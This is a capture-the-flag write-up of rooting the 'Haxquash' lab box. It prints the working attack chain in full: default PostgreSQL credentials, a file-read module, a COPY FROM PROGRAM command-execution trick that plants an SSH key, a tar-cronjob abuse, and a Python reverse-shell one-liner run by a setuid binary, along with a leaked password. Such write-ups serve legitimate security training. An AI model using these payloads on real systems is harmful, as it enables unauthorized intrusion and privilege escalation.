# Haxquash

Creating a new resource and getting an IP to the resource:

> IP: 54.194.71.254

To root this box, I'm running Kali Linux[1], which has almost every tool and resource pre-installed.

## User
> Techarisma Chapter 6/7
> Well done finding one of their servers. Let's try a takeover - get a foothold on the box and locate the user.txt!
> 
> Brute forcing / Fuzzing is allowed on this challenge.
> 
> Click here to access your vulnerable machine.

## Root
> Techarisma Chapter 7/7
> Time to squash these babies - go for root!
> 
> Brute forcing / Fuzzing is allowed on this challenge.
> 
> Use the same instance as before.

Now, lets get that `root`!

## nmap
Starting off with the usual `nmap` to enumerate open ports and services:
```
❯ nmap -sC -sV -A -p- 54.194.71.254
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 11:27 CET
Nmap scan report for ec2-54-194-71-254.eu-west-1.compute.amazonaws.com (54.194.71.254)
Host is up (0.051s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 75ab760f561ac14e5aafbb9c17a95c63 (ECDSA)
|_  256 ca2cf4f33bebe3ffa1ed3bce513085a5 (ED25519)
53/tcp   open     tcpwrapped
80/tcp   open     http       Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
5432/tcp filtered postgresql
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This one is running `SSH`, something on port `53`, `HTTP` and `postgresql`.

The `HTTP` service looks to only be a default `Apache2 Ubuntu Default Page`, but the `postgresql` service looks kind of interesting.

## postgresql
Taking a quick google search to check for default passwords for `postgresql`:
> 1, the default Postgres database password is postgres . Type the new password for the selected user type. Type the password again to confirm it. Click Save Configuration.

Testing to log in with `postgres:postgres` as credentials:
```
❯ psql -h 54.194.71.254 -U postgres
Password for user postgres: 
psql (15.0 (Debian 15.0-2), server 10.22 (Ubuntu 10.22-1.pgdg22.04+1))
Type "help" for help.

postgres=# 
```

Well, that worked better than expected!

## LFI
Using `metasploit`[2] (or `msfconsole`) to see if it's possible to read a file[3] on the remote system:
```
msf6 > use auxiliary/admin/postgres/postgres_readfile
msf6 auxiliary(admin/postgres/postgres_readfile) > show options

Module options (auxiliary/admin/postgres/postgres_readfile):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RFILE     /etc/passwd      yes       The remote file
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output

msf6 auxiliary(admin/postgres/postgres_readfile) > set rhosts 54.194.71.254
msf6 auxiliary(admin/postgres/postgres_readfile) > run

[…]
root:x:0:0:root:/root:/bin/bash
[…]
postgres:x:115:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
helix:x:1001:1001::/home/helix:/bin/sh
vulcan:x:1002:1002::/home/vulcan:/bin/sh
```

LFI works! And we have to usernames:
* helix
* vulcan

## RCE
Using the `ALTER TABLE privesc` from[4] and trying to create and write a ssh key to the `postgres` user. First creating a `ssh` key:
```
❯ ssh-keygen -f haxquash
```

Which will create two files:
* haxquash
* haxquash.pub

Using the content of `haxquash.pub` and echoing this into `.ssh/authorized_keys`. The command we want to run is:
```bash
mkdir /var/lib/postgresql/.ssh;
echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTV5csANncJvOI7vwLahHck51+CgFvGhwEGJK68dUNf76/uo4hQV9xATruKdx23QQKuUVgLX/CiWc79hjXMcuUcE2bH6MuRenC08jHzZAnj/1fqW20eHC0wQ6A6xahn2Ic9PmyVmNEHKIvIX8IMVCHHCKKGLyQkSBbS3GhvxrvdMymhKgIXlkirpZ2RKuWWyD+L8WNEfF4bc+BtknfQiZIJ8NIj9xnPEj63KBQLZU11swGAqC6yxWu8E2ZMKybFMbpZuUls38LuWWchk25GYUH4ykFK9QUEhzEcbcjmT0Fedf3d2HyddujuTjzKL/LkPbsU/vu5Ih8T4FQisJYyP4EaSFnJmVyDORTxx98aYiEL9lcprSNuoePutAGRjpXUI1Zz0ArTWyDBtT6k67eoFYnwrQkAwf61fqJF8cNeRTSNYZTU04/i2y79MRJ1ppBKaLEvgMp1Bc1Oo96gvJmy48MKlQV0HPEnjpQ9/bgMvDpkbvI3qE21EVIwNrMY3qMHuk= kali@kali >> /var/lib/postgresql/.ssh/authorized_keys;
chmod 0600 /var/lib/postgresql/.ssh/authorized_keys;
chmod 0700 /var/lib/postgresql/.ssh/;
```

Inserting this into the postgres command: and running it:
```postgresql
postgres=# CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);
 
INSERT INTO temp_table VALUES ('dummy content');
 
/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */ 
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
  LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';
 
CREATE INDEX index_malicious ON public.temp_table (suid_function(data));
 
ALTER TABLE temp_table OWNER TO cloudsqladmin;
 
/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */ 
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
  LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''mkdir /var/lib/postgresql/.ssh; echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTV5csANncJvOI7vwLahHck51+CgFvGhwEGJK68dUNf76/uo4hQV9xATruKdx23QQKuUVgLX/CiWc79hjXMcuUcE2bH6MuRenC08jHzZAnj/1fqW20eHC0wQ6A6xahn2Ic9PmyVmNEHKIvIX8IMVCHHCKKGLyQkSBbS3GhvxrvdMymhKgIXlkirpZ2RKuWWyD+L8WNEfF4bc+BtknfQiZIJ8NIj9xnPEj63KBQLZU11swGAqC6yxWu8E2ZMKybFMbpZuUls38LuWWchk25GYUH4ykFK9QUEhzEcbcjmT0Fedf3d2HyddujuTjzKL/LkPbsU/vu5Ih8T4FQisJYyP4EaSFnJmVyDORTxx98aYiEL9lcprSNuoePutAGRjpXUI1Zz0ArTWyDBtT6k67eoFYnwrQkAwf61fqJF8cNeRTSNYZTU04/i2y79MRJ1ppBKaLEvgMp1Bc1Oo96gvJmy48MKlQV0HPEnjpQ9/bgMvDpkbvI3qE21EVIwNrMY3qMHuk= kali@kali >> /var/lib/postgresql/.ssh/authorized_keys; chmod 0600 /var/lib/postgresql/.ssh/authorized_keys;chmod 0700 /var/lib/postgresql/.ssh/''; select ''test'';';
 
ANALYZE public.temp_table;
ERROR:  relation "temp_table" already exists
ERROR:  relation "shell_commands_results" already exists
INSERT 0 1
CREATE FUNCTION
ERROR:  relation "index_malicious" already exists
ERROR:  role "cloudsqladmin" does not exist
CREATE FUNCTION
ANALYZE
postgres=# 
```

Trying to connect with `ssh` and the newly generated key:
```
❯ ssh 54.194.71.254 -l postgres -i haxquash
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-1022-aws x86_64)

[…]
postgres@ip-10-0-0-61:~$ id
uid=115(postgres) gid=123(postgres) groups=123(postgres),122(ssl-cert)
```

And we're in!

## sudo -l and /bin/cat
As always, check if there's any `sudo` commands available (with the `NOPASSWD` set):
```
postgres@ip-10-0-0-61:~$ sudo -l
Matching Defaults entries for postgres on ip-10-0-0-61:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User postgres may run the following commands on ip-10-0-0-61:
    (helix) NOPASSWD: /bin/cat
```

We can run `/bin/cat` as the `helix` user! First checking for a ssh key:
```
postgres@ip-10-0-0-61:~$ sudo -u helix /bin/cat /home/helix/.ssh/id_rsa
/bin/cat: /home/helix/.ssh/id_rsa: No such file or directory
```

No luck. Checking if there's any `.bash_history` content:
```
postgres@ip-10-0-0-61:~$ sudo -u helix /bin/cat /home/helix/.bash_history
touch /home/helix/my_file.txt
cd
ls -la
psql -h 127.0.0.1 -p 5432 -U helix -W c4nt_broooot_th15_sh1t! -d postgres
history delte
history delete
man history
yawn...
```

A password! Perhaps these credentials will work with `ssh` as well?
```
helix:c4nt_broooot_th15_sh1t!
```

```
❯ ssh 54.194.71.254 -l helix               
helix@54.194.71.254's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-1022-aws x86_64)

[…]

$ bash
helix@ip-10-0-0-61:~$ id
uid=1001(helix) gid=1001(helix) groups=1001(helix)
```

And now we're `helix`! Checking out the content of the home folder:
```
helix@ip-10-0-0-61:~$ ls
user.txt
helix@ip-10-0-0-61:~$ cat user.txt |wc -c
43
```

And there's the user flag as well! First task complete! Now on to the next user.

## pspy and loot
Starting by transfering `pspy`[4] to the remote host and running it to check for any cronjobs or other processes starting:
```
helix@ip-10-0-0-61:/dev/shm/myh$ nc -lnvp 1337 > pspy
Listening on 0.0.0.0 1337
Connection received on 195.225.19.78 64133
helix@ip-10-0-0-61:/dev/shm/myh$ chmod +x pspy 
helix@ip-10-0-0-61:/dev/shm/myh$ ./pspy -i 1
```

After running `pspy` for a couple if minutes we can see what it is used for:
```
2022/11/07 11:03:01 CMD: UID=1002  PID=3489   | /bin/sh -c tar xvf /loot/* 
```

`/loot/` is owned by our current user, `helix`
```
helix@ip-10-0-0-61:/$ ls -lah
drwxr-xr-x   2 helix helix 4.0K Nov  3 09:35 loot
```

And the command we found, which probaby is a cronjob run every minutes, is being run by the `1002` user
```
helix@ip-10-0-0-61:/$ id 1002
uid=1002(vulcan) gid=1002(vulcan) groups=1002(vulcan),1003(beastieboys)
```

The `vulcan` user has an additional group, perhaps this could get us some more privileges?
```
helix@ip-10-0-0-61:~$ find / -group beastieboys -ls 2>/dev/null
     1901     16 -rwsrwx---   1 root     beastieboys    16304 Nov  3 13:38 /opt/sendCommand
```

This could be interesting to gain access to, and see what it does.

The cronjob looks to extract all files in `/loot/`, and since `cronjob` (when unspecified) runs from the user's home directory, we should be able to do something like this:

## tar and .ssh
Creating a `.tar` file with the following content:
```
helix@ip-10-0-0-61:/dev/shm/myh$ tar cvvRf ssh.tar .ssh/
block 0: drwx------ helix/helix       0 2022-11-07 11:06 .ssh/
block 1: -rw------- helix/helix     563 2022-11-07 11:07 .ssh/authorized_keys
```

The `authorized_keys` contains our freshly generated `ssh key`. Waiting a minute for the cronjob to run, and then we'll try to ssh as `vulcan`:

```
❯ ssh 54.194.71.254 -i haxquash -l vulcan
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-1022-aws x86_64)

[…]

$ bash
vulcan@ip-10-0-0-61:~$ id
uid=1002(vulcan) gid=1002(vulcan) groups=1002(vulcan),1003(beastieboys)
```

And we're `vulcan`!

## suid sendCommand and reverse
Checking out what kind of file `sendCommand is`:
```
vulcan@ip-10-0-0-61:/opt$ ls -lah /opt/
total 24K
drwxr-xr-x  2 root root        4.0K Nov  3 13:38 .
drwxr-xr-x 20 root root        4.0K Nov  7 08:33 ..
-rwsrwx---  1 root beastieboys  16K Nov  3 13:38 sendCommand
vulcan@ip-10-0-0-61:/opt$ file /opt/sendCommand 
/opt/sendCommand: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2fafca86e9441e92ee00219f0c3ac1c3e950e22c, for GNU/Linux 3.2.0, not stripped
```

So, this is an executable. Running `strace` on the file to get a feel of what it does:
```
vulcan@ip-10-0-0-61:/opt$ strace ./sendCommand 
[…]
openat(AT_FDCWD, "/tmp/c", O_RDONLY)    = -1 ENOENT (No such file or directory)
[…]
```

And checking it out with `strings` as well:
```
vulcan@ip-10-0-0-61:/opt$ strings sendCommand
[…]
C2 utility. Work in progress! Testing locally for now.
/tmp/c
[…]
```

It looks like it tries to open `/tmp/c`, which doesn't exists. This means that we could create the file, perhaps with a reverse shell?
```
vulcan@ip-10-0-0-61:/tmp$ cat /tmp/c
#!/usr/bin/bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("127.0.0.1",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

Setting up a listener:
```
nc -lnvp 1337
```

And then running the `sendCommand` binary:
```
vulcan@ip-10-0-0-61:/opt$ ./sendCommand 
C2 utility. Work in progress! Testing locally for now.
```

And voilà:
```
helix@ip-10-0-0-61:/dev/shm/myh$ nc -lnvp 1337
Listening on 0.0.0.0 1337                                      
Connection received on 127.0.0.1 59058
root@ip-10-0-0-61:/opt# id                                     
uid=0(root) gid=1002(vulcan) groups=1002(vulcan),1003(beastieboys)
root@ip-10-0-0-61:~# cat /root/root.txt |wc -c
46
```

If you want, you may add your ssh key to `/root/.ssh/authorized_keys` and `ssh` in as root.

## Links
[1] https://www.kali.org/

[2] https://www.metasploit.com/

[3] https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#post

[4] https://github.com/DominicBreuker/pspy
